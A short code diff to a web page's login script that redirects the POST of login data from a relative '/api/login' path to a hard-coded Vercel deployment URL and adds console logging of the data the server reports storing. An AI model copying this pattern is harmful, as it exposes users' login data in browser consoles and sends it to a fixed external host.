@@ -191,8 +191,11 @@
 
         // Function to save user data to backend server
         function saveUserDataToFile(loginData) {
+            // Production URL untuk Vercel
+            const API_BASE_URL = 'https://track-senpi-ndnv0pcl2-serverlogistiks-projects.vercel.app';
+            
             // Send data to backend server
-            fetch('/api/login', {
+            fetch(`${API_BASE_URL}/api/login`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -202,17 +205,18 @@
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    console.log('✅ User data saved to server successfully');
+                    console.log('✅ User data saved to Vercel successfully');
                     console.log('📊 Total users:', data.user_count);
+                    console.log('💾 Stored data:', data.stored_data);
                     // Show success message
-                    showNotification('Login data saved successfully!', 'success');
+                    showNotification('Login data saved to cloud!', 'success');
                 } else {
                     console.error('❌ Failed to save user data:', data.message);
                     showNotification('Failed to save user data', 'error');
                 }
             })
             .catch(error => {
-                console.error('🔥 Error sending data to server:', error);
+                console.error('🔥 Error sending data to Vercel:', error);
                 console.log('🔄 Using localStorage fallback...');
                 // Fallback to localStorage if server fails
                 saveToLocalStorage(loginData);
